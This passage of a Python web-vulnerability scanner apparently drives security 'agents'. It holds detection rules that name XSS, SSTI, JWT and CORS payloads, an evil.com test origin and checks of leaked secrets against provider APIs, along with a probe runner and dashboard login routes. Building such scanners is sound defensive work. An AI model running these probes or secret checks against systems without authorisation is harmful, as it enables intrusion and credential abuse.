        (lambda o: "HIDDEN_FIELD_SECRET" in o,
         "High-entropy value in hidden HTML form field — possible token, CSRF nonce, or API key embedded in HTML", "medium"),
        (lambda o: "WEBPACK_EXPOSED" in o,
         "Webpack internals visible in production bundle — module graph exposes internal path and component structure", "info"),
        # ── Verification results (CMD 7) ────────────────────────────────────
        (lambda o: "VERIFIED_SECRET:GITHUB_TOKEN" in o or "VERIFIED_SECRET:GITHUB_FINE_TOKEN" in o,
         "CONFIRMED LIVE: GitHub access token verified active — repository access is compromised RIGHT NOW", "critical"),
        (lambda o: "VERIFIED_SECRET:STRIPE_LIVE_KEY" in o or "VERIFIED_SECRET:STRIPE_RESTRICTED" in o,
         "CONFIRMED LIVE: Stripe secret key verified active — live payment API access compromised RIGHT NOW", "critical"),
        (lambda o: "VERIFIED_SECRET:OPENAI_KEY" in o,
         "CONFIRMED LIVE: OpenAI API key verified active — AI API quota and conversation history accessible", "critical"),
        (lambda o: "VERIFIED_SECRET:SLACK_TOKEN" in o,
         "CONFIRMED LIVE: Slack token verified active — workspace messages and channels accessible RIGHT NOW", "critical"),
        (lambda o: "VERIFIED_SECRET:SENDGRID_KEY" in o,
         "CONFIRMED LIVE: SendGrid API key verified active — email sending capability and contact lists compromised", "critical"),
        (lambda o: "VERIFIED_SECRET:HUGGINGFACE_TOKEN" in o,
         "CONFIRMED LIVE: HuggingFace token verified active — model and dataset access compromised", "critical"),
        (lambda o: "VERIFIED_SECRET:MAILGUN_KEY" in o,
         "CONFIRMED LIVE: Mailgun API key verified active — send-as-your-domain capability confirmed", "critical"),
        (lambda o: "VERIFIED_SECRET:GOOGLE_API_KEY" in o,
         "CONFIRMED LIVE: Google API key verified active — Maps, Firebase or other Google services accessible", "critical"),
        (lambda o: "VERIFIED_SECRET:GITLAB_PAT" in o,
         "CONFIRMED LIVE: GitLab personal access token verified active — repository access compromised", "critical"),
        (lambda o: "VERIFIED_SECRET:NETLIFY_TOKEN" in o or "VERIFIED_SECRET:DIGITALOCEAN_TOKEN" in o,
         "CONFIRMED LIVE: Cloud platform token verified active — hosting/infrastructure access compromised", "critical"),
        (lambda o: re.search(r"VERIFIED_SECRET:[A-Z_]+", o) is not None,
         "CONFIRMED LIVE: Secret token verified against provider API — active credential leak confirmed", "critical"),
        (lambda o: "UNVERIFIED_SECRET:" in o,
         "Secret token format matched but API verification failed — review manually to confirm if active", "low"),
        (lambda o: "VERIFY_NO_API:" in o,
         "Secret token found but no live verifier available — manual review required to confirm if active", "low"),
        (lambda o: "VERIFY_INCONCLUSIVE:" in o,
         "Verification inconclusive (network timeout) — secret token found but live status unknown", "info"),
        # ── Accuracy signals (improved FP visibility) ───────────────────────
        (lambda o: "TOKEN_TEMPLATE:" in o,
         "Potential secret value repeats 4+ times in source — likely documentation template, not a real credential", "info"),
        (lambda o: "KEYWORD_TEMPLATE:" in o,
         "Keyword-matched credential value appears as template/placeholder — high-frequency repetition suggests docs", "info"),
        (lambda o: o.count("KEYWORD_LOW_ENT:") >= 3,
         "Multiple low-entropy keyword matches suppressed — secret variable names present but values look like config defaults", "info"),
    ],
    "API Spec Agent": [
        (lambda o: '"swagger"' in o or '"openapi"' in o,
         "OpenAPI/Swagger spec publicly accessible — full API surface exposed", "medium"),
        (lambda o: "__typename" in o,
         "GraphQL endpoint active and responsive to introspection queries", "info"),
    ],
    "OAuth Agent": [
        (lambda o: "authorization_endpoint" in o.lower() and "token_endpoint" in o.lower(),
         "OpenID Connect configuration (.well-known/openid-configuration) publicly accessible", "info"),
    ],
    "WAF Bypass": [
        (lambda o: any(w in o.lower() for w in ["cloudflare", "sucuri", "imperva", "akamai", "f5", "barracuda"]),
         "WAF detected — active security filtering in place", "info"),
        (lambda o: "<script>alert(1)</script>" in o,
         "WAF bypass: XSS payload reflected without blocking — WAF not filtering this vector", "high"),
    ],
    "CSRF Agent": [
        (lambda o: "set-cookie:" in o.lower() and "samesite" not in o.lower(),
         "Session cookie missing SameSite attribute — cross-site request forgery attacks possible", "medium"),
    ],
    "Passive Scanner": [
        # ══ Security Headers ═══════════════════════════════════════════════
        (lambda o: "MISSING [HIGH]: HSTS" in o,
         "HTTP Strict Transport Security (HSTS) missing — SSL stripping and protocol downgrade attacks possible", "high"),
        (lambda o: "MISSING [HIGH]: CSP" in o,
         "Content-Security-Policy header missing — XSS payloads execute without browser restriction", "high"),
        (lambda o: "MISSING [MEDIUM]: X-Frame-Options" in o,
         "X-Frame-Options missing — page can be embedded in iframe for clickjacking attacks", "medium"),
        (lambda o: "MISSING [MEDIUM]: X-Content-Type" in o,
         "X-Content-Type-Options: nosniff missing — MIME-type confusion attacks possible", "medium"),
        (lambda o: "MISSING [LOW]: Referrer-Policy" in o,
         "Referrer-Policy missing — URL parameters and tokens leak to third-party sites via Referer header", "low"),
        (lambda o: "MISSING [MEDIUM]: COOP" in o,
         "Cross-Origin-Opener-Policy missing — Spectre/cross-origin attacks against page context possible", "medium"),
        (lambda o: "CSP_UNSAFE: unsafe-inline" in o,
         "CSP contains 'unsafe-inline' — inline script execution allowed, bypassing XSS protection", "high"),
        (lambda o: "CSP_UNSAFE: unsafe-eval" in o,
         "CSP contains 'unsafe-eval' — eval() and Function() constructor allowed, XSS via eval possible", "high"),
        (lambda o: "CSP_UNSAFE: wildcard" in o,
         "CSP contains wildcard source (*) — any origin can serve scripts, CSP effectively disabled", "high"),
        (lambda o: "HSTS_DISABLED" in o,
         "HSTS explicitly disabled (max-age=0) — browser will not enforce HTTPS for this domain", "high"),
        (lambda o: "HSTS_WEAK" in o,
         "HSTS max-age too short (< 6 months) — browsers stop enforcing HTTPS quickly after removal", "medium"),
        (lambda o: "HSTS_PARTIAL" in o,
         "HSTS missing includeSubDomains — subdomains can be attacked via HTTP downgrade", "medium"),
        # ══ Information Disclosure ═════════════════════════════════════════
        (lambda o: "DISCLOSURE:" in o,
         "HTTP header discloses server technology — server banner/X-Powered-By/X-Generator reveals stack", "low"),
        (lambda o: "SQL_ERROR:" in o,
         "Database error message in HTTP response — SQL/MySQL/PostgreSQL error leaks schema information", "high"),
        (lambda o: "PYTHON_TRACE:" in o or "JAVA_TRACE:" in o or "DOTNET_ERROR:" in o or "PHP_ERROR:" in o,
         "Application stack trace in HTTP response — internal file paths, class names, and logic exposed", "high"),
        (lambda o: "PATH_DISCLOSURE:" in o,
         "Internal file system path disclosed in response — server directory structure revealed to attacker", "medium"),
        (lambda o: "INTERNAL_IP:" in o,
         "RFC-1918 private IP address in HTTP response — internal network topology disclosed", "low"),
        (lambda o: "HARDCODED_CRED:" in o,
         "Hardcoded credential string in response body — password or secret visible without authentication", "critical"),
        (lambda o: "API_KEY:" in o,
         "API key pattern detected in HTTP response — third-party service key may be compromised", "critical"),
        (lambda o: "PRIVATE_KEY:" in o,
         "Private key material in HTTP response — cryptographic key fully exposed, immediate rotation required", "critical"),
        (lambda o: "COMMENT_DISCLOSURE:" in o,
         "Sensitive information in HTML comment — credentials, TODOs, or debug info in page source", "medium"),
        (lambda o: "EMAIL_DISCLOSURE:" in o,
         "Email address disclosed in HTTP response — enables phishing, enumeration, and spam targeting", "low"),
        (lambda o: "CC_NUMBER:" in o,
         "Potential credit card number in HTTP response — PCI-DSS violation, immediate investigation required", "critical"),
        (lambda o: "SSN:" in o,
         "Potential Social Security Number (SSN) in HTTP response — PII exposure, regulatory violation", "critical"),
        (lambda o: "ACCESS_TOKEN:" in o,
         "Bearer/access token in HTTP response body — may allow impersonation of the affected account", "critical"),
        (lambda o: "JWT_IN_BODY:" in o,
         "JWT token exposed in HTTP response body — token may be replayable for authentication bypass", "high"),
        (lambda o: "SOURCE_MAP:" in o or "SOURCE_MAP_URL:" in o,
         "Source map reference in response — JavaScript source code recoverable from .map file", "medium"),
        (lambda o: "GENERATOR_META:" in o,
         "Generator meta tag discloses CMS/framework version — targeted CVE exploitation possible", "low"),
        (lambda o: "DATA_ATTR_DISCLOSURE:" in o,
         "data-env/version/build attribute in HTML — deployment environment information exposed", "low"),
        (lambda o: "DIR_LISTING:" in o,
         "Directory listing enabled — file system contents browsable without authentication", "high"),
        # ══ JavaScript Secrets ═════════════════════════════════════════════
        (lambda o: "JS_SECRET_AWS_KEY:" in o,
         "AWS access key ID found in JavaScript bundle — cloud infrastructure fully accessible", "critical"),
        (lambda o: "JS_SECRET_AWS_SECRET:" in o,
         "AWS secret access key in JavaScript — attacker has full AWS API access", "critical"),
        (lambda o: "JS_SECRET_GOOGLE_API_KEY:" in o,
         "Google API key in JavaScript bundle — Maps/Cloud/Firebase services billable abuse possible", "high"),
        (lambda o: "JS_SECRET_GITHUB_TOKEN:" in o,
         "GitHub token in JavaScript — repository read/write access, code and secrets exposed", "critical"),
        (lambda o: "JS_SECRET_STRIPE_KEY:" in o,
         "Stripe API key in JavaScript — payment processing abuse, charge creation possible", "critical"),
        (lambda o: "JS_SECRET_PRIVATE_KEY_IN_JS:" in o,
         "Private key material in JavaScript bundle — cryptographic operations fully exposed", "critical"),
        (lambda o: "JS_SECRET_HARDCODED_PASSWORD:" in o,
         "Hardcoded password string in JavaScript bundle — credential stuffing/lateral movement risk", "high"),
        (lambda o: "JS_SECRET_HARDCODED_SECRET:" in o or "JS_SECRET_DB_CONNECTION_STRING:" in o,
         "Hardcoded secret or database connection string in JavaScript bundle", "high"),
        (lambda o: "JS_DANGEROUS_JS_SINK_EVAL:" in o,
         "eval() usage in JavaScript — potential code injection vector if user input reaches this sink", "medium"),
        (lambda o: "JS_DANGEROUS_JS_SINK_INNERHTML:" in o,
         "innerHTML assignment in JavaScript — potential DOM-based XSS if user input is unsanitised", "medium"),
        (lambda o: "JS_DANGEROUS_JS_OPEN_REDIRECT_SINK:" in o,
         "location.href/replace/assign in JavaScript — potential open redirect or DOM-based XSS sink", "medium"),
        # ══ Cookie Security ════════════════════════════════════════════════
        (lambda o: "COOKIE_NO_HTTPONLY:" in o,
         "Session cookie missing HttpOnly flag — JavaScript can read cookie via document.cookie in XSS", "medium"),
        (lambda o: "COOKIE_NO_SECURE:" in o,
         "Session cookie missing Secure flag — cookie transmitted over unencrypted HTTP connections", "medium"),
        (lambda o: "COOKIE_NO_SAMESITE:" in o,
         "Session cookie missing SameSite attribute — cross-site request forgery (CSRF) risk", "medium"),
        (lambda o: "COOKIE_SAMESITE_NONE_INSECURE:" in o,
         "SameSite=None cookie without Secure flag — cross-origin cookie sent over HTTP", "high"),
        (lambda o: "COOKIE_SHORT_TOKEN:" in o,
         "Session cookie value suspiciously short — may be predictable or brute-forceable", "medium"),
        # ══ TLS/SSL ════════════════════════════════════════════════════════
        (lambda o: bool(re.search(r"WEAK_PROTO_(?:SSL2|SSL3|TLS1):", o)),
         "Weak TLS/SSL protocol supported — BEAST, POODLE, or DROWN attack possible", "high"),
        (lambda o: "WEAK_PROTO_TLS1_1:" in o,
         "TLS 1.1 still supported — deprecated protocol, PCI-DSS non-compliance", "medium"),
        (lambda o: "WEAK_CIPHER:" in o,
         "Server accepts weak cipher suites (NULL/EXPORT/RC4/DES) — traffic decryption possible", "critical"),
        (lambda o: "CERT_EXPIRED:" in o,
         "SSL certificate has expired — browsers show security warning, service disruption", "high"),
        (lambda o: "CERT_EXPIRING_CRITICAL:" in o,
         "SSL certificate expires within 14 days — immediate renewal required", "high"),
        (lambda o: "CERT_EXPIRING_SOON:" in o,
         "SSL certificate expires within 30 days — renewal should be scheduled", "medium"),
        (lambda o: "CERT_SELF_SIGNED:" in o,
         "Self-signed SSL certificate — not trusted by browsers, MITM attacks undetectable", "medium"),
        # ══ CORS ═══════════════════════════════════════════════════════════
        (lambda o: bool(re.search(r"access-control-allow-origin:\s*\*", o, re.I)),
         "CORS wildcard (*) origin — any website can read this application's responses", "high"),
        (lambda o: bool(re.search(r"access-control-allow-origin:\s*https?://evil\.com", o, re.I)),
         "CORS reflects arbitrary origin — cross-origin credential theft and data exfiltration possible", "critical"),
        (lambda o: "access-control-allow-origin: null" in o.lower(),
         "CORS allows null origin — sandboxed iframes and file:// pages can read responses", "medium"),
        # ══ Cache & Content-Type ═══════════════════════════════════════════
        (lambda o: "CACHE_NO_STORE_MISSING:" in o,
         "Cache-Control: no-store missing — sensitive page content may be cached by CDN or proxy", "medium"),
        (lambda o: "ETAG_INODE_LEAK:" in o,
         "ETag header leaks inode number — internal server filesystem information disclosed", "low"),
        (lambda o: "CHARSET_MISSING:" in o,
         "HTML served without charset declaration — charset sniffing attack via MIME confusion possible", "low"),
        (lambda o: "XCTO_MISSING:" in o or "XCTO_NOT_NOSNIFF:" in o,
         "X-Content-Type-Options: nosniff missing — browser may MIME-sniff and execute non-script responses", "medium"),
        # ══ HTTP Methods & Forms ═══════════════════════════════════════════
        (lambda o: bool(re.search(r"allow:.*(?:TRACE|TRACK)", o, re.I)),
         "HTTP TRACE/TRACK method enabled — cross-site tracing (XST) allows stealing auth headers", "medium"),
        (lambda o: bool(re.search(r"allow:.*(?:DELETE|PUT)", o, re.I)) and "=OPTIONS=" in o,
         "HTTP DELETE or PUT method allowed — unauthorised data modification or deletion possible", "high"),
        (lambda o: "=TRACE=" in o and bool(re.search(r"TRACE .* HTTP", o)),
         "HTTP TRACE echoes request headers — can expose auth tokens via cross-site tracing", "medium"),
        (lambda o: "FORM_NO_CSRF:" in o,
         "Password form missing CSRF token — cross-site request forgery on authentication form", "high"),
        (lambda o: "FORM_PASSWORD_IN_GET:" in o,
         "Password submitted via GET request — credentials visible in URL, browser history, and server logs", "critical"),
        (lambda o: "FORM_AUTOCOMPLETE:" in o,
         "Password field missing autocomplete=off — browser may save and autofill credentials", "low"),
        # ══ Files & Redirects ══════════════════════════════════════════════
        (lambda o: "EXPOSED_FILE_200:" in o,
         "Sensitive file accessible (200 OK) — configuration, backup, or manifest file exposed", "high"),
        (lambda o: bool(re.search(r"EXPOSED_FILE_200:.*(?:\.env|web\.config|\.htaccess|WEB-INF)", o)),
         "Critical configuration file exposed — credentials and server configuration publicly readable", "critical"),
        (lambda o: "REDIRECT_TO_HTTP:" in o,
         "HTTPS page redirects to HTTP — MITM attack possible on redirect destination", "high"),
        (lambda o: bool(re.search(r"NO_SRI: .+", o)),
         "External script or stylesheet loaded without Subresource Integrity (SRI) — supply chain attack possible", "medium"),
        (lambda o: "MIXED_CONTENT:" in o,
         "HTTP resources loaded on HTTPS page — mixed content allows MITM interception of page assets", "medium"),
    ],
    "Recon Agent": [
        # ── Server / tech disclosure ──────────────────────────────────────
        (lambda o: bool(re.search(r"server:\s*\S+/[\d.]+", o, re.I)),
         "Server version disclosed in HTTP headers — exact version aids exploit selection", "low"),
        (lambda o: "x-powered-by:" in o.lower(),
         "X-Powered-By header discloses backend technology stack", "low"),
        (lambda o: bool(re.search(r"DISCLOSURE:.*(?:server|x-powered-by|x-aspnet|x-generator|x-backend)", o, re.I)),
         "Backend technology disclosed via HTTP header — aids attacker reconnaissance", "low"),
        (lambda o: bool(re.search(r"Technologies detected:(?!.*none identified)", o, re.I)),
         "Technology stack fingerprinted — framework/CMS/library identified via response analysis", "info"),
        (lambda o: bool(re.search(r"version hint:", o, re.I)),
         "Library version string found in response — specific CVEs may apply", "low"),
        # ── Missing security headers ──────────────────────────────────────
        (lambda o: "MISSING: HSTS" in o,
         "HSTS header missing — SSL stripping and downgrade attacks possible", "medium"),
        (lambda o: "MISSING: CSP" in o,
         "Content-Security-Policy missing — XSS attacks execute without restriction", "medium"),
        (lambda o: "MISSING: X-Frame-Options" in o and "MISSING: CSP" in o,
         "Clickjacking protection missing — X-Frame-Options and CSP frame-ancestors both absent", "medium"),
        (lambda o: "MISSING: X-Content-Type-Options" in o,
         "X-Content-Type-Options: nosniff missing — MIME-sniffing attacks possible", "low"),
        (lambda o: "MISSING: Referrer-Policy" in o,
         "Referrer-Policy missing — URL tokens/parameters may leak to third-party sites", "low"),
        # ── TLS/SSL issues ────────────────────────────────────────────────
        (lambda o: bool(re.search(r"tls1(?:\s|:).*CONNECTED|SSLv3.*CONNECTED", o, re.I)),
         "Weak TLS protocol supported (TLSv1.0 or SSLv3) — BEAST/POODLE attacks possible", "high"),
        (lambda o: bool(re.search(r"tls1_1.*CONNECTED", o, re.I)),
         "TLS 1.1 supported — deprecated protocol, upgrade to TLS 1.2+ required", "medium"),
        (lambda o: bool(re.search(r"notAfter=.*202[0-4]", o)),
         "SSL certificate expired or expiring within current year — service disruption risk", "high"),
        (lambda o: bool(re.search(r"verify\s+error|self.signed|unable to get local issuer", o, re.I)),
         "SSL certificate validation error — self-signed or untrusted CA", "medium"),
        # ── Cookie security ───────────────────────────────────────────────
        (lambda o: bool(re.search(r"Cookie '.*' missing:.*HttpOnly", o)),
         "Session cookie missing HttpOnly flag — accessible via document.cookie in XSS attack", "medium"),
        (lambda o: bool(re.search(r"Cookie '.*' missing:.*Secure", o)),
         "Session cookie missing Secure flag — transmitted over plaintext HTTP connections", "medium"),
        (lambda o: bool(re.search(r"Cookie '.*' missing:.*SameSite", o)),
         "Session cookie missing SameSite attribute — cross-site request forgery risk", "medium"),
        # ── CORS ──────────────────────────────────────────────────────────
        (lambda o: bool(re.search(r"access-control-allow-origin:\s*\*", o, re.I)),
         "CORS wildcard origin — any website can read responses, credential theft if cookies allowed", "high"),
        (lambda o: bool(re.search(r"access-control-allow-origin:\s*https?://evil\.com", o, re.I)),
         "CORS misconfiguration — arbitrary origin reflected, cross-origin data theft possible", "high"),
        (lambda o: "access-control-allow-origin: null" in o.lower(),
         "CORS allows null origin — sandboxed iframes and local files can read responses", "medium"),
        # ── HTTP methods ──────────────────────────────────────────────────
        (lambda o: bool(re.search(r"(?:Allow|Access-Control-Allow-Methods):[^\r\n]*(?:TRACE|TRACK)", o, re.I)),
         "HTTP TRACE/TRACK method enabled — cross-site tracing (XST) attack possible", "medium"),
        (lambda o: bool(re.search(r"(?:Allow|Access-Control-Allow-Methods):[^\r\n]*(?:DELETE|PUT)", o, re.I)),
         "Dangerous HTTP methods enabled (DELETE/PUT) — unauthorised data modification risk", "medium"),
        # ── DNS / email security ──────────────────────────────────────────
        (lambda o: "=== TXT (SPF/DMARC) ===" in o and not re.search(r"v=spf1", o, re.I),
         "SPF record missing — domain is spoofable for phishing and email fraud", "medium"),
        (lambda o: "=== TXT (SPF/DMARC) ===" in o and not re.search(r"v=DMARC1", o, re.I),
         "DMARC record missing — email spoofing without policy enforcement possible", "medium"),
        # ── WAF / open ports ──────────────────────────────────────────────
        (lambda o: not bool(re.search(r"cloudflare|akamai|sucuri|imperva|f5|barracuda|fortiweb|firewall|waf", o, re.I)),
         "No WAF detected — application exposed directly without web application firewall protection", "info"),
        (lambda o: bool(re.search(r"27017/tcp.*open|6379/tcp.*open|5432/tcp.*open|3306/tcp.*open", o, re.I)),
         "Database port exposed — MongoDB/Redis/PostgreSQL/MySQL directly reachable from internet", "critical"),
        (lambda o: bool(re.search(r"9200/tcp.*open|9300/tcp.*open", o, re.I)),
         "Elasticsearch port exposed — unauthenticated data access possible", "critical"),
        (lambda o: bool(re.search(r"crt\.sh: ([1-9]\d+) subdomains", o)),
         "Multiple subdomains found via certificate transparency — expanded attack surface", "info"),
    ],
    "SSTI Agent": [
        (lambda o: "49" in o and "{{7*7}}" not in o,
         "Possible SSTI: arithmetic payload {{7*7}} evaluated to 49 in response", "high"),
    ],
    "JWT Agent": [
        (lambda o: "JWT_VULN_ALG_NONE:" in o,
         "JWT algorithm:none bypass — server accepts unsigned token, authentication fully bypassed", "critical"),
        (lambda o: "JWT_WEAK_SECRET:" in o,
         "JWT signed with weak/common secret — attacker can forge tokens for any user", "critical"),
        (lambda o: bool(re.search(r"KID_PATH_TRAVERSAL.*VULN!", o)),
         "JWT kid path traversal — /dev/null key forces empty secret, signature bypass possible", "critical"),
        (lambda o: bool(re.search(r"KID_SQLI.*VULN!", o)),
         "JWT kid SQL injection — kid header injects SQL into key lookup query", "critical"),
        (lambda o: "JWT_KID:" in o,
         "JWT kid header present — path traversal and SQL injection in kid parameter possible", "high"),
        (lambda o: "JWT_JKU:" in o,
         "JWT jku/x5u header present — remote key injection attack possible", "high"),
        (lambda o: "JWT_RSA:" in o,
         "JWT uses RSA algorithm — RS256→HS256 algorithm confusion attack may be possible", "medium"),
        (lambda o: "JWT_EXPIRED:" in o,
         "JWT token is expired — verify server rejects it; if accepted, expiry validation is missing", "medium"),
        (lambda o: "JWT_REPLAY_AUTH:" in o,
         "JWT token accepted on multiple endpoints — token replay / missing revocation check", "medium"),
        (lambda o: "JWT_FOUND:" in o,
         "JWT tokens discovered in application responses — token structure analysed", "info"),
    ],
    "OAuth Agent": [
        (lambda o: "OAUTH_REDIRECT_VULN:" in o,
         "OAuth redirect_uri open redirect — attacker can steal authorization codes via crafted redirect", "critical"),
        (lambda o: "OAUTH_IMPLICIT_FLOW:" in o,
         "OAuth implicit flow supported — access tokens leaked in URL fragments and browser history", "high"),
        (lambda o: "OAUTH_STATIC_STATE:" in o,
         "OAuth state parameter is static — CSRF attack on OAuth flow possible", "high"),
        (lambda o: "OIDC_FOUND:" in o,
         "OpenID Connect discovery endpoint found — full auth configuration publicly accessible", "info"),
        (lambda o: "authorization_endpoint" in o.lower() and "token_endpoint" in o.lower(),
         "OpenID Connect configuration (.well-known/openid-configuration) publicly accessible", "info"),
    ],
    "IDOR Agent": [
        (lambda o: "IDOR_CANDIDATE:" in o,
         "IDOR candidate found — API endpoint returns data for sequential IDs without auth check", "high"),
        (lambda o: "IDOR_UUID_CANDIDATE:" in o,
         "IDOR via UUID — endpoint returns data for probed UUID without authorization", "high"),
        (lambda o: "IDOR_DATA:" in o and bool(re.search(r"IDOR_DATA:.*(?:email|password|ssn|credit|token)", o, re.I)),
         "IDOR exposes sensitive fields (email/password/token) — cross-user data access confirmed", "critical"),
        (lambda o: "HPP_IDOR:" in o and bool(re.search(r"HTTP 200", o)),
         "HTTP parameter pollution enables IDOR — multiple id values accepted, last wins", "high"),
        (lambda o: '"id":2' in o or '"user_id":2' in o or '"userId":2' in o,
         "API returns object ID 2 data — verify if cross-user data access is possible (IDOR)", "high"),
        (lambda o: re.search(r'"email":\s*"[^"]+@[^"]+"', o) is not None and "200" in o,
         "API returns user email on ID probe — potential IDOR data exposure", "high"),
    ],
    "Rate Limit Agent": [
        (lambda o: "VULN_NO_RATE_LIMIT:" in o,
         "No rate limiting on login endpoint — brute-force password attack possible without throttling", "high"),
        (lambda o: "OTP_VULN:" in o,
         "OTP/2FA endpoint has no rate limiting — 6-digit code brute-forceable in 1M requests", "critical"),
        (lambda o: "OTP_NO_THROTTLE:" in o,
         "OTP verification endpoint missing rate limit — exhaustive code enumeration possible", "high"),
        (lambda o: "TIMING_ORACLE:" in o,
         "Username enumeration via timing — >100ms response time difference reveals valid usernames", "medium"),
        (lambda o: "BODY_ORACLE:" in o,
         "Username enumeration via response — different error messages reveal valid account existence", "medium"),
        (lambda o: "RESET_ENUM_VULN:" in o,
         "Password reset email enumeration — different HTTP codes reveal registered email addresses", "medium"),
        (lambda o: len(re.findall(r'(?:HTTP/[\d.]+ 200|" 200 |\bstatus["\s:]+200\b)', o)) > 8,
         "No rate limiting detected — many 200 responses without 429 throttling", "high"),
    ],
    "Business Logic Agent": [
        (lambda o: bool(re.search(r'BИЗLOGIC_VULN negative_price|BIZ_LOGIC_VULN negative', o, re.I)),
         "Negative price accepted — attacker can receive money or get items free", "critical"),
        (lambda o: bool(re.search(r'BИЗLOGIC_VULN zero_price|BIZ_LOGIC_VULN zero', o, re.I)),
         "Zero price accepted — items purchasable for free via price manipulation", "critical"),
        (lambda o: bool(re.search(r'BИЗLOGIC_VULN.*overflow|BIZ_LOGIC_VULN.*overflow', o, re.I)),
         "Integer overflow in quantity — extremely large quantity accepted, may cause underflow", "high"),
        (lambda o: "MASS_ASSIGN_VULN:" in o,
         "Mass assignment vulnerability — privileged fields (role/isAdmin/credits) accepted on update", "critical"),
        (lambda o: "WORKFLOW_SKIP_VULN:" in o,
         "Workflow skip — checkout/payment step bypassed via direct endpoint access", "high"),
        (lambda o: bool(re.search(r'"isAdmin":\s*true|"role":\s*"admin"', o, re.I))
             and bool(re.search(r'"(?:success|ok|status)"\s*:\s*(?:true|"success"|"ok")', o, re.I)),
         "Admin/privileged role reflected in API response with success status — mass assignment confirmed", "critical"),
    ],
    "Subdomain Enum": [
        (lambda o: "SUBDOMAIN_TAKEOVER_VULN:" in o,
         "Subdomain takeover confirmed — CNAME points to unclaimed service, full subdomain control possible", "critical"),
        (lambda o: "SUBDOMAIN_LIVE:" in o,
         "Live subdomains discovered — additional attack surface identified for testing", "info"),
        (lambda o: bool(re.search(r'CRT_SH: ([1-9]\d+) unique', o)),
         "Multiple subdomains found via certificate transparency — expanded attack surface", "info"),
        (lambda o: "→ 200" in o or "→ 301" in o,
         "Live subdomains responding — additional attack surface confirmed", "info"),
    ],
    "Nuclei Agent": [
        (lambda o: '"severity":"critical"' in o or '"severity":"high"' in o,
         "Nuclei detected critical/high severity vulnerability — review nuclei output", "critical"),
        (lambda o: '"severity":"medium"' in o,
         "Nuclei detected medium severity vulnerability — review nuclei output", "medium"),
    ],
}


def _run_static_agent(state: dict, agent_id: str, target: str) -> None:
    """Run predefined commands for no-key mode; collect output, then pattern-match findings."""
    name  = state["name"]
    cmds  = _STATIC_CMDS.get(name, [])
    host  = urlparse(target).netloc or target

    if not cmds:
        state["output"].append(f"[STATIC] No static commands defined for {name}")
        return

    accumulated = []   # collect all output for pattern matching
    useful_outputs = 0
    for tpl, reason in cmds:
        if state.get("stop"):
            break
        cmd = tpl.replace("{target}", shlex.quote(target)).replace("{host}", shlex.quote(host))
        state["output"].append(f"[Static] $ {cmd}")
        state["output"].append(f"  → {reason}")
        out = _run_cmd(cmd)
        if out == "(no output)":
            state["output"].append("(no output)")
        else:
            for _ol in out.splitlines():
                if _ol.strip():
                    state["output"].append(_ol)
            useful_outputs += 1
        state["commands_run"] += 1
        accumulated.append(out)

    # Pattern-based finding extraction
    combined = "\n".join(o for o in accumulated if o != "(no output)")
    patterns = _STATIC_PATTERNS.get(name, [])
    new_findings = []
    for check_fn, finding_text, severity in patterns:
        try:
            if check_fn(combined):
                new_findings.append({"text": finding_text, "severity": severity})
        except Exception:
            pass

    if new_findings:
        with _lock:
            _record_findings(state, agent_id, target, new_findings)
        state["output"].append(f"[STATIC] {len(new_findings)} finding(s) detected via pattern analysis")
    elif useful_outputs == 0:
        state["output"].append(f"[STATIC] Target did not respond to {name} probes — no vectors found (add AI key for adaptive scanning)")
    else:
        state["output"].append(f"[STATIC] {useful_outputs} probe(s) returned data — no issues matched patterns (add AI key for deeper analysis)")

    # ── Spider Agent: harvest discovered URLs/paths into engine sitemap ────────
    if name == "Spider Agent" and combined:
        _harvest_spider_urls(combined, target, state)

    with _lock:
        _context[f"{state['name']}_static"] = f"static scan completed for {target}"


def _harvest_spider_urls(combined: str, target: str, state: dict) -> None:
    """Parse Spider Agent output and feed discovered paths into _engine_sitemap / _ajax_pages."""
    import re as _re
    from urllib.parse import urlparse as _up, urljoin as _uj

    base = target.rstrip("/")
    base_parsed = _up(base)
    base_host = base_parsed.netloc or base

    discovered: list[dict] = []
    seen: set[str] = set()

    def _add(url: str, status: int = 0, source: str = "spider_agent"):
        url = url.strip()
        if not url or url in seen:
            return
        try:
            p = _up(url)
            if p.scheme not in ("http", "https", ""):
                return
            if not p.netloc:
                url = _uj(base, url)
                p = _up(url)
            if base_host and p.netloc and p.netloc != base_host:
                return
        except Exception:
            return
        seen.add(url)
        discovered.append({"url": url, "status": status, "source": source})

    # Pattern 1: "200  https://..." or "301  /path" lines from path probe step
    for m in _re.finditer(r'^(\d{3})\s+(https?://\S+|/\S*)', combined, _re.MULTILINE):
        code, url = int(m.group(1)), m.group(2)
        _add(url, code, "spider_probe")

    # Pattern 2: bare relative paths from link extraction (start with /)
    for m in _re.finditer(r'^(/[^\s\'"<>]+)', combined, _re.MULTILINE):
        _add(m.group(1), 0, "spider_links")

    # Pattern 3: full URLs in output (katana, sitemap.xml <loc> lines)
    for m in _re.finditer(r'https?://[^\s\'"<>]+', combined):
        url = m.group(0).rstrip(".,)")
        _add(url, 0, "spider_katana")

    if not discovered:
        return

    # Merge into engine sitemap (if available)
    with _engine_lock:
        if _engine_sitemap is not None:
            for d in discovered:
                try:
                    _engine_sitemap.add_page(d["url"], d["status"], "text/html", {}, "")
                except Exception:
                    pass

    # Merge into _ajax_pages (shown in Advanced Crawler panel)
    global _ajax_pages, _ajax_urls_found
    with _engine_lock:
        existing = {p.get("url") for p in _ajax_pages}
        new_pages = [
            {"url": d["url"], "status": d["status"], "content_type": "text/html",
             "source": d["source"], "title": ""}
            for d in discovered if d["url"] not in existing
        ]
        _ajax_pages = list(_ajax_pages) + new_pages
        _ajax_urls_found = len(_ajax_pages)

    state["output"].append(f"[Spider] Harvested {len(discovered)} URLs → added {len(new_pages)} new to sitemap")


# ── REST API ──────────────────────────────────────────────────────────────────

@app.route("/login", methods=["GET", "POST"])
def login_page():
    if session.get("authenticated"):
        return redirect(url_for("index"))
    error = None
    username = ""
    if req.method == "POST":
        username = (req.form.get("username") or "").strip()
        password = (req.form.get("password") or "").strip()
        if _is_login_limited(username):
            error = "Too many failed attempts — try again later"
            return render_template("login.html", error=error, username=username), 429
        if _verify_dashboard_credentials(username, password):
            _clear_failed_logins(username)
            session.permanent = True
            session["authenticated"] = True
            session["username"] = username
            _ensure_csrf_token()
            return redirect(url_for("index"))
        _record_failed_login(username)
        error = "Invalid credentials — access denied"
    return render_template("login.html", error=error, username=username)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login_page"))


@app.route("/login2")
def login2_page():
    if session.get("authenticated"):
        return redirect(url_for("index"))
    return render_template("login2.html")


@app.route("/login3")
def login3_page():
    if session.get("authenticated"):
